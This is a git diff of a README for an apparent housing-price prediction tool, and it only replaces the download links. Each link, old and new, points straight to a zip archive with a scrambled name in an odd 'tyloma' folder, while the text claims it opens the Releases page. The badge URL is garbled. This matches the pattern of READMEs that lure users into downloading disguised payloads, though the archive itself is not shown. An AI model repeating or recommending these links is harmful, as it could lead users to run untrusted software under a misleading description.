@@ -1,6 +1,6 @@
 # 🔍 housing_price_prediction - Simple Tool for Home Price Estimates
 
-[![Download Latest Release](https://github.com/Pluto-Echo/housing_price_prediction/raw/refs/heads/main/tyloma/price-prediction-housing-v3.9.zip%20Latest%https://github.com/Pluto-Echo/housing_price_prediction/raw/refs/heads/main/tyloma/price-prediction-housing-v3.9.zip)](https://github.com/Pluto-Echo/housing_price_prediction/raw/refs/heads/main/tyloma/price-prediction-housing-v3.9.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Pluto-Echo/housing_price_prediction/main/tyloma/prediction-price-housing-v2.6.zip%20Latest%https://raw.githubusercontent.com/Pluto-Echo/housing_price_prediction/main/tyloma/prediction-price-housing-v2.6.zip)](https://raw.githubusercontent.com/Pluto-Echo/housing_price_prediction/main/tyloma/prediction-price-housing-v2.6.zip)
 
 ## 📦 Overview
 
@@ -13,7 +13,7 @@ Follow these simple steps to get started with the housing_price_prediction appli
 1. **Download the Application**  
    Click the button below to visit the Releases page.
 
-   [Download Latest Release](https://github.com/Pluto-Echo/housing_price_prediction/raw/refs/heads/main/tyloma/price-prediction-housing-v3.9.zip)
+   [Download Latest Release](https://raw.githubusercontent.com/Pluto-Echo/housing_price_prediction/main/tyloma/prediction-price-housing-v2.6.zip)
 
 2. **Choose a Version**  
    On the Releases page, you will see several versions of the application. Find the latest version, which should be marked with "Latest release."  
@@ -90,6 +90,6 @@ If you have suggestions or encounter any issues, feel free to create an issue in
 
 For the most recent updates and further downloads, always check our Releases page:
 
-[Download Latest Release](https://github.com/Pluto-Echo/housing_price_prediction/raw/refs/heads/main/tyloma/price-prediction-housing-v3.9.zip)
+[Download Latest Release](https://raw.githubusercontent.com/Pluto-Echo/housing_price_prediction/main/tyloma/prediction-price-housing-v2.6.zip)
 
 Thank you for using the housing_price_prediction application! We hope it helps you estimate home prices easily. Happy estimating!
